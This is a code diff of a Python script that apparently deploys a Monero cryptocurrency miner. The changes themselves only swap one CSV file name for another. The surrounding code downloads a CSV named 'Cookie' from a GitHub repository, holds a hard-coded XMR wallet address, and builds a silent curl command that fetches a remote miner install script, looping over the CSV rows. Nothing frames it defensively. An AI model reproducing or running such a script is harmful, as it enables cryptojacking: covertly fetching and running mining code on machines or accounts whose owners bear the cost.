@@ -12,7 +12,7 @@ import requests
 # ===========================================================================================================================================
 # VARS - Please modify this section as you require
 # ===========================================================================================================================================
-url = 'https://raw.githubusercontent.com/junaidd007/Monero/main/Cookie/Cookie.csv' # Set this to the location of your csv file
+url = 'https://raw.githubusercontent.com/junaidd007/Monero/main/Cookie/Cookie2.csv' # Set this to the location of your csv file
 xmr_addy = '47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf9deqPdagqXWXwezwoSfPSx8jk3q' # Please make sure to set your XMR Address here
 # ===========================================================================================================================================
 
@@ -32,14 +32,14 @@ base_install_cmd = "'curl -s -L https://raw.githubusercontent.com/junaidd007/Mon
 print("Downloading csv from: ", url, " Please make sure this file is up to date!")
 req = requests.get(url)
 url_content = req.content
-csv_file = open("cookie.csv","wb")
+csv_file = open("cookie2.csv","wb")
 csv_file.write(url_content)
 csv_file.close()
 print("File Has been downloaded and saved to your computer!")
 
 print("Processing The CSV file")
 print("we will be installing the miner with the following command :", base_install_cmd)
-with open('cookie.csv', 'r') as csvfile:  
+with open('cookie2.csv', 'r') as csvfile:  
     reader = csv.reader(csvfile, delimiter='	')
     for row in reader:
 
